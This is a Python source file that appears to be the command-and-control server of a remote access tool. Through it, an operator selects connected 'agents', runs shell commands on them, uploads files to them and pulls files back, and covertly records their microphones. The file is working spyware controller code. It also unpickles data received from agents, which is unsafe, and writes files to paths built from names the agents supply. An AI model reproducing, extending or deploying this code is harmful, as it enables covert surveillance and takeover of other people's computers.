from threading import Thread
from server import WebSocketServerThread
from console import ConsoleThread
from logging import Logger
from Queue import Queue, Empty
import sys
import json
import base64
import os
import cPickle
from helpers import Colour
import soundfile as sf


class MainApplicationThread(Thread):
    def __init__(self, port, debug=False):
        Thread.__init__(self)
        self.port = port
        self.debug = debug
        self.logger = Logger("main")
        self._fromWsQueue = Queue(0)
        self._fromConsole = Queue(0)
        self._toConsole   = Queue(0)
        self._agents = {}
        self.timed_out = False
        self.timeout = 120
        self.current_recording = ""

    def run(self):
        self.ws = WebSocketServerThread(self)
        self.ws.daemon = True

        self.console = ConsoleThread(self)
        self.console.daemon = True
        
        self.logger.info("Starting up WebSocketServer...")
        self.ws.start()

        self.logger.info("Staring up Console Interface...")
        self.console.start()
        self.handle_messages()

    def set_timeout(self, timeout):
        self.timeout = int(timeout)

    def shutdown(self):
        self._fromConsole.put('shutdown')

    def new_client(self, sid, socket):
        self._fromWsQueue.put({"type": "new-agent", "sid": sid, "socket": socket})

    def list_agents(self):
        return self._agents.keys()

    def download_file(self, file_name):
        self.current_agent.write_message({"type": "download", "file": base64.b64encode(file_name)})

    def upload_file(self, file_to_upload, target):
        try:
            if os.path.exists(file_to_upload):
                content = base64.b64encode(open(file_to_upload, "rb").read())
                file_to_upload = base64.b64encode(file_to_upload)
                target = base64.b64encode(target)
                self.current_agent.write_message({"type": "file", "target": target, "content": content})
                response = self._toConsole.get(timeout=self.timeout)
            else:
                response = Colour.red("[*] File does not exist")
        except Empty:
            self.timed_out = True
            response = Colour.red("[*] No response from agent")
        finally:
            return response

    def client_disconnect(self, sid):
        self._fromWsQueue.put({"type": "client-disconnect", "sid": sid})

    def new_message(self, sid, message):
        message = json.loads(message)
        message["sid"] = sid

        self._fromWsQueue.put(message)

    def agent_alive(self, agent):
        if agent not in self._agents.keys(): return False

        socket = self._agents[agent]
        socket.write_message(json.dumps({"type": "ping"}))
        response = self._toConsole.get()
        return response

    def set_agent(self, agent):
        if agent == "":
            self.current_agent = None
        else:
            self.current_agent = self._agents[agent]

    def run_command(self, cmd):
        if self.current_agent == None:
            self.logger.error("No agent selected")
            return ""

        self.current_agent.write_message(json.dumps({"type": "command", "value": base64.b64encode(cmd)}))
        try:
            response = self._toConsole.get(timeout=self.timeout)
        except Empty:
            self.timed_out = True            
            self.logger.error("Command timeout")
            response = ""
        return response

    def record_mic(self, target):
        self.current_recording = target
        self.current_agent.write_message({"type": "start-recording"})

    def stop_recording(self):
        self.current_agent.write_message({"type": "stop-recording"})

    def recieveMessage(self, queue, handler):
        try:
            msg = queue.get_nowait()
            handler(msg)
        except Empty:
            pass

    def handle_from_console(self, msg):
        if msg == "shutdown":
            quit()

    def handle_from_ws(self, msg):
        if msg["type"] == "new-agent":
            self._agents[msg["sid"]] = msg["socket"]

        if msg["type"] == "client-disconnect":
            self._agents.pop(msg["sid"], None)

        if msg["type"] == "pong":
            self._toConsole.put(True)

        if msg["type"] == "response":
            if not self.timed_out:
                self._toConsole.put(base64.b64decode(msg["value"]))
            else:
                self.timed_out = False

        if msg["type"] == "file":

            file_name = "/tmp/" + base64.b64decode(msg["name"])
            with open(file_name, "wb") as f:
                f.write(base64.b64decode(msg["content"])) 
            self.logger.info("Downloaded {} from {}".format(file_name, msg["sid"]))

        if msg["type"] == "audio":
            data = cPickle.loads(base64.b64decode(msg["data"]))

            if os.path.exists(self.current_recording):
                with sf.SoundFile(self.current_recording, "r+") as s:
                    s.seek(len(s))
                    s.write(data)
            else:
                sf.write(self.current_recording, data, 44100)

    def handle_messages(self):
        while True:
            self.recieveMessage(self._fromConsole, self.handle_from_console)            
            self.recieveMessage(self._fromWsQueue, self.handle_from_ws)            
